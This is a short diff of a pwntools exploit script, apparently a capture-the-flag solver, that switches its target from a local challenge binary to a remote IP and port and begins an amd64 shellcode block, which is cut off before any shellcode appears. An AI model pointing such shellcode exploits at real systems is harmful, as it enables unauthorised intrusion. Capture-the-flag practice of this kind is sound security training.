@@ -1,6 +1,7 @@
 from pwn import *
 
-p = process("dist/chall")
+# p = process("dist/chall")
+p = remote("137.184.250.54", 7051)
 context.arch = 'amd64'
 
 shellcode = asm('''
